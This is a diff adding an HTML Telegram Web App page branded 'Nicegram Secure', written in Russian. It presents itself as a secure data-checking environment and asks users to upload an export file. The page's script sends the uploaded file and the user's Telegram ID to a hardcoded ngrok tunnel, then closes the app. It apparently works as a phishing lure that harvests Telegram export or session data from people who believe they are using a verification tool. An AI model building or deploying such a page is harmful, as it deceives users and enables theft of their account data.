@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Nicegram Secure</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- Подключаем jQuery (нужен для частиц) -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #050505;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        /* --- 1. Эффект частиц (Фон) --- */
+        #particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1; /* Самый нижний слой */
+            opacity: 0.6;
+        }
+
+        /* --- 2. Эффект Liquid Background (Жидкие пятна) --- */
+        .liquid-blob {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: 0;
+            animation: float 10s infinite ease-in-out;
+            opacity: 0.6;
+        }
+
+        .blob-1 {
+            width: 300px;
+            height: 300px;
+            background: #4facfe;
+            top: -50px;
+            left: -50px;
+            animation-delay: 0s;
+        }
+
+        .blob-2 {
+            width: 250px;
+            height: 250px;
+            background: #f093fb;
+            bottom: -50px;
+            right: -50px;
+            animation-delay: 5s;
+        }
+
+        .blob-3 {
+            width: 200px;
+            height: 200px;
+            background: #66a6ff;
+            top: 40%;
+            left: 40%;
+            animation-delay: 2s;
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -50px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
+            100% { transform: translate(0, 0) scale(1); }
+        }
+
+        /* --- 3. Glassmorphism Card (Стекло) --- */
+        .glass-card {
+            position: relative;
+            z-index: 10; /* Поверх всего */
+            width: 85%;
+            max-width: 350px;
+            padding: 40px 20px;
+            
+            /* Эффект матового стекла */
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+            border-left: 1px solid rgba(255, 255, 255, 0.3);
+            
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            border-radius: 25px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 60px;
+            margin-bottom: 10px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff 30%, #a5a5a5 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        h1 {
+            font-size: 22px;
+            margin: 10px 0;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* Кнопка с эффектом свечения */
+        .btn {
+            background: linear-gradient(90deg, #007aff, #00c6ff);
+            color: white;
+            border: none;
+            padding: 16px 0;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:active {
+            transform: scale(0.96);
+            box-shadow: 0 5px 10px rgba(0, 122, 255, 0.2);
+        }
+
+        .btn-text {
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Скрытый инпут */
+        input[type="file"] { display: none; }
+        
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            font-weight: 500;
+            min-height: 20px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Жидкий фон (Blobs) -->
+    <div class="liquid-blob blob-1"></div>
+    <div class="liquid-blob blob-2"></div>
+    <div class="liquid-blob blob-3"></div>
+
+    <!-- Контейнер для частиц -->
+    <div id="particles"></div>
+
+    <!-- Основная стеклянная карточка -->
+    <div class="glass-card">
+        <div class="logo">N</div>
+        <h1 id="greeting">Nicegram</h1>
+        <p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+
+        <input type="file" id="fileInput">
+        
+        <button class="btn" onclick="document.getElementById('fileInput').click()">
+            <span class="btn-text">📁 Выбрать файл</span>
+        </button>
+
+        <div id="status"></div>
+    </div>
+
+    <!-- Скрипт частиц (Встроенный аналог jParticle) -->
+    <script>
+        (function() {
+            var canvas = document.createElement('canvas');
+            var ctx = canvas.getContext('2d');
+            var container = document.getElementById('particles');
+            container.appendChild(canvas);
+
+            var particles = [];
+            var width, height;
+            
+            // Настройки частиц
+            var particleCount = 60;
+            var connectionDistance = 100;
+            var speed = 0.5;
+
+            function resize() {
+                width = container.offsetWidth;
+                height = container.offsetHeight;
+                canvas.width = width;
+                canvas.height = height;
+            }
+
+            function Particle() {
+                this.x = Math.random() * width;
+                this.y = Math.random() * height;
+                this.vx = (Math.random() - 0.5) * speed;
+                this.vy = (Math.random() - 0.5) * speed;
+                this.size = Math.random() * 2 + 1;
+            }
+
+            Particle.prototype.update = function() {
+                this.x += this.vx;
+                this.y += this.vy;
+
+                if (this.x < 0 || this.x > width) this.vx *= -1;
+                if (this.y < 0 || this.y > height) this.vy *= -1;
+            };
+
+            Particle.prototype.draw = function() {
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            };
+
+            function initParticles() {
+                resize();
+                for (var i = 0; i < particleCount; i++) {
+                    particles.push(new Particle());
+                }
+                animate();
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, width, height);
+                
+                for (var i = 0; i < particles.length; i++) {
+                    particles[i].update();
+                    particles[i].draw();
+
+                    // Рисуем линии
+                    for (var j = i + 1; j < particles.length; j++) {
+                        var dx = particles[i].x - particles[j].x;
+                        var dy = particles[i].y - particles[j].y;
+                        var dist = Math.sqrt(dx * dx + dy * dy);
+
+                        if (dist < connectionDistance) {
+                            ctx.strokeStyle = 'rgba(255, 255, 255, ' + (1 - dist / connectionDistance) * 0.2 + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(particles[i].x, particles[i].y);
+                            ctx.lineTo(particles[j].x, particles[j].y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+                requestAnimationFrame(animate);
+            }
+
+            window.addEventListener('resize', resize);
+            initParticles();
+        })();
+    </script>
+
+    <!-- Логика работы с ботом -->
+    <script>
+        // ============================================
+        // ВАЖНО: ВСТАВЬТЕ ССЫЛКУ ИЗ NGROK СЮДА
+        const SERVER_URL = " https://unimmaculate-breathable-beau.ngrok-free.dev"; 
+        // ============================================
+
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.enableClosingConfirmation(); // Спрашивать перед закрытием
+
+        const fileInput = document.getElementById('fileInput');
+        const statusText = document.getElementById('status');
+        const greeting = document.getElementById('greeting');
+
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            greeting.innerText = `Привет, ${tg.initDataUnsafe.user.first_name}`;
+        }
+
+        fileInput.addEventListener('change', () => {
+            const file = fileInput.files[0];
+            if (file) {
+                uploadFile(file);
+            }
+        });
+
+        function uploadFile(file) {
+            statusText.innerText = "⏳ Загрузка на сервер...";
+            statusText.style.color = "#FFD700"; // Gold
+
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('user_id', tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "0000");
+
+            fetch(`${SERVER_URL}/upload`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusText.innerText = "✅ Файл успешно отправлен!";
+                    statusText.style.color = "#34c759";
+                    
+                    // Вибрация успеха (Haptic)
+                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+
+                    setTimeout(() => tg.close(), 2000);
+                } else {
+                    throw new Error("Server error");
+                }
+            })
+            .catch(error => {
+                console.error(error);
+                statusText.innerText = "❌ Ошибка соединения.";
+                statusText.style.color = "#ff453a";
+                if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            });
+        }
+    </script>
+</body>
+</html>
